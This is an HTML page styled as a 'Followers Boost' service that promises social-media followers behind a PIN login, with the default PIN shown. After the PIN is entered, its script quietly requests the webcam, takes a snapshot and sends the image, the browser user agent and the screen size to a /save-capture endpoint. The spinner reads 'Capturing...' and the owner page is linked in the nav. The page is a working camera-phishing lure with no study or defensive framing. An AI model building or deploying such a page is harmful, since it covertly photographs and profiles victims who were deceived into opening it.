<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GET FOLLOWERS</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    .fade-in {
      animation: fadeIn 1s ease-in-out forwards;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .shake {
      animation: shake 0.4s ease-in-out;
    }
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-8px); }
      50% { transform: translateX(8px); }
      75% { transform: translateX(-4px); }
    }

    /* Success pulse animation */
    .success-pulse {
      animation: pulse 1s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.05); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }

    /* Spinner */
    .spinner {
      border: 4px solid rgba(255,255,255,0.3);
      border-top: 4px solid #3b82f6;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white flex flex-col min-h-screen">

  <!-- Navbar -->
  <nav class="w-full bg-gray-800/80 backdrop-blur-md shadow-md p-4 flex justify-between items-center">
    <h1 class="text-2xl font-extrabold tracking-wide text-blue-400">‚ö° FOLLOWERS BOOST</h1>
    <button onclick="toggleMenu()" class="text-3xl hover:text-blue-400 transition">‚ò∞</button>
    <div id="navLinks" class="hidden absolute top-14 right-4 bg-gray-700 rounded-xl shadow-lg overflow-hidden">
      <a href="index.html" class="block px-6 py-3 hover:bg-blue-600 transition">üè† Home</a>
      <a href="owner.html" class="block px-6 py-3 hover:bg-blue-600 transition">üîë Owner</a>
    </div>
  </nav>

  <!-- PIN Notice -->
  <div id="pinNotice" class="w-full bg-blue-600 text-white p-3 text-center font-semibold shadow-lg">
    üîë Enter the correct PIN to continue. (Default User PIN: <span class="font-mono">1111</span>)
  </div>
  
  <!-- User PIN Section -->
  <div class="flex-grow flex flex-col items-center justify-center px-6 text-center">
    <div id="loginCard" class="bg-gray-800/70 backdrop-blur-lg p-8 rounded-2xl shadow-2xl max-w-md w-full fade-in">
      <h2 class="text-3xl font-bold mb-4 text-blue-400">Enter Access PIN</h2>
      <p class="text-gray-300 mb-6">Secure access required before proceeding üöÄ</p>
      
      <div class="flex items-center justify-center">
        <input id="userPin" type="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
          class="px-4 py-3 rounded-l-xl border-none focus:ring-2 focus:ring-blue-400 text-black w-40">
        <button onclick="userLogin()" 
          class="bg-blue-500 px-6 py-3 rounded-r-xl font-semibold hover:bg-blue-600 hover:shadow-[0_0_15px_#3b82f6] transition">Login</button>
      </div>

      <div id="spinner" class="hidden mt-6">
        <div class="spinner"></div>
        <p class="mt-2 text-blue-400">Capturing...</p>
      </div>

      <p id="userStatus" class="mt-6 text-lg font-semibold"></p>
    </div>
  </div>

  <!-- Footer -->
  <footer class="w-full bg-gray-800/80 text-center p-4 text-gray-400 text-sm">
    ‚ö° Powered by <span class="text-blue-400 font-semibold">Followers Boost</span>
  </footer>

<script>
const USER_PIN = "1111";

function toggleMenu() {
  document.getElementById("navLinks").classList.toggle("hidden");
}

function userLogin() {
  const pinInput = document.getElementById("userPin");
  const pin = pinInput.value;
  const status = document.getElementById("userStatus");
  const card = document.getElementById("loginCard");
  const spinner = document.getElementById("spinner");

  if (pin === USER_PIN) {
    status.innerHTML = "‚úÖ <span class='text-green-400'>Access Granted...</span>";
    status.classList.add("success-pulse");
    spinner.classList.remove("hidden");
    setTimeout(captureImage, 1500);
  } else {
    status.innerHTML = "‚ùå <span class='text-red-400'>Wrong PIN!</span>";
    card.classList.remove("shake"); 
    void card.offsetWidth; 
    card.classList.add("shake");
  }
}

function captureImage() {
  const spinner = document.getElementById("spinner");
  spinner.classList.add("hidden");

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/png");

        stream.getTracks().forEach(track => track.stop());

        fetch("/save-capture", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            time: new Date().toLocaleString(),
            ip: "192.168.0." + Math.floor(Math.random() * 255),
            device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
            img: imageData
          })
        })
        .then(() => {
          document.getElementById("userStatus").innerHTML = "‚úÖ <span class='text-green-400'>Access successful.</span>";
        })
        .catch(err => {
          document.getElementById("userStatus").innerHTML = "‚ö†Ô∏è <span class='text-yellow-400'>Error saving!</span>";
          console.error(err);
        });
      }, 1200);
    })
    .catch(err => {
      document.getElementById("userStatus").innerHTML = "‚ö†Ô∏è <span class='text-red-400'>Camera blocked!</span>";
      console.error("Camera error:", err);
    });
}
</script>
</body>
</html>
